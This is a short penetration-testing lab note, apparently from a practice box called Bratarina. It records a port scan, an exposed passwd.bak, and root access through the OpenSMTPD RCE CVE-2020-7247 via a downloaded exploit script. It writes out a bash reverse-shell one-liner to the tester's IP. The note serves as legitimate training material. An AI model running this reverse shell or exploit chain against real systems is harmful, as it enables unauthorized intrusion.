202307101739
Status: #idea
Tags: [[Labs]], [[pg]]

# Bratarina
IP: 192.168.167.71

## Recon

Ports open:

```
PORT    STATE  SERVICE
22/tcp  open   ssh
25/tcp  open   smtp
53/tcp  closed domain
80/tcp  open   http
445/tcp open   microsoft-ds
```

Port 445:

- There is a passwd.bak file that shows the passwd file of the machine.

Port 25:

- Our nmap scan revealed that the service running is `OpenSMTPD 2.0.0`
- Some enumeration shows us that this service version is vulnerable to RCE.
- CVE-2020-7247

## Exploitation

- We download the exploit script and get a Proof-of-Concept going:

![[bratarina_poc.png]]

<img src="https://github.com/charlier0cks/Pentest-Notes/blob/main/Attachments/bratarina_poc.png">

- We were able to ping our machine and intercept it.
- We can now try to get a reverse shell

```bash
bash -i >& /dev/tcp/192.168.45.240/80 0>&1
```

- It seems that we cannot use specific characters with this exploit.
- A quick work around was to try create a bash script that executes this reverse shell code.
- Then we deliver it to the target machine and execute it with our exploit script.
- This quickly gets us a reverse shell as root

![[bratarina_root.png]]

<img src="https://github.com/charlier0cks/Pentest-Notes/blob/main/Attachments/bratarina_root.png">

- root!






---
# References

OpenSMTPD 6.6.1 - Remote Code Execution: https://www.exploit-db.com/exploits/47984